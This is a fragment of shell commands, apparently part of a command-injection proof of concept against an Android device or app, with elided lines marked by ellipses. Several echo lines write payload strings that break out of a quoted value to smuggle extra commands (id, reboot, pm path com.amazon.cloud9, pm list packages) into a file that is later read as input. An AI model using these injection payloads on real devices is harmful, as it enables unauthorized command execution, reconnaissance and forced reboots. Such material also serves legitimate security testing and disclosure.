...
echo "A';id>/data/local/tmp/cmi_proof.txt;'" > /data/local/tmp/payload.txt
...
read -r RECON < /data/local/tmp/payload.txt
...
echo "A';reboot>/data/local/tmp/cmi_proof.txt;'" > /data/local/tmp/payload.txt
echo "A';pm path com.amazon.cloud9>/data/local/tmp/cmi_proof.txt;'" > /data/local/tmp/payload.txt
echo "A';pm list packages>/data/local/tmp/cmi_proof.txt;'" > /data/local/tmp/payload.txt
